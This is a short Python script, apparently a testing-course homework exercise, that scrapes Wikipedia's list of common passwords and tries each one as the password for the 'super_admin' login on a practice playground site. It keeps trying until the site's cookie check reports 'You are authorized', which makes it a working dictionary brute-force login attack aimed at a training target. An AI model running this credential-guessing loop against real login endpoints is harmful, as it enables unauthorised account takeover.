import requests
from lxml import html


response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
tree = html.fromstring(response.text)
locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
passwords = tree.xpath(locator)

for password in passwords:
    password = str(password).strip()
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                              data={"login": "super_admin", "password": password})
    auth_cookie = response1.cookies.get_dict()['auth_cookie']
    response2 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
                             params={"auth_cookie": auth_cookie})
    if response2.text == 'You are authorized':
        print("password: " + password)
        print(response2.text)
        break
